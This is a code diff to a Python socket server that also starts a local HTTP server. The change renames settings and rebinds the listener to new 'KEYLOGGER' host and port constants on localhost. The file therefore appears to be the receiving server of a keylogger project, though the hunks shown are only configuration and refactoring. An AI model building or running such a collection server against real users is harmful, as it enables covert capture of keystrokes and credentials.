@@ -11,12 +11,14 @@ import subprocess
 
 # Global variables
 HEADER_LENGTH = 24
-hostName = "localhost"
-serverPort = 8080
+HOSTNAME = "localhost"
+SERVERPORT = 8080
+KEYLOGGER_HOSTNAME = "localhost"
+KEYLOGGER_PORT = 8081
 
 
-def start(hostName, serverPort):
-    subprocess.run(["python3", "-m", "http.server", str(serverPort), "--bind", hostName])
+def start(hostname, serverPort):
+    subprocess.run(["python3", "-m", "http.server", str(serverPort), "--bind", hostname])
 
 
 class Server:
@@ -77,7 +79,7 @@ class Server:
     def start(self):
         try:
             # start web server
-            t.Thread(target=start, args=(hostName, serverPort)).start()
+            t.Thread(target=start, args=(HOSTNAME, SERVERPORT)).start()
             # start listening for incomming connections
             self.__server_socket.listen()
             while True:
@@ -118,5 +120,5 @@ class Server:
             self.exit()
 
 
-server = Server("127.0.0.1", 11234)
+server = Server(KEYLOGGER_HOSTNAME, KEYLOGGER_PORT)
 server.start()
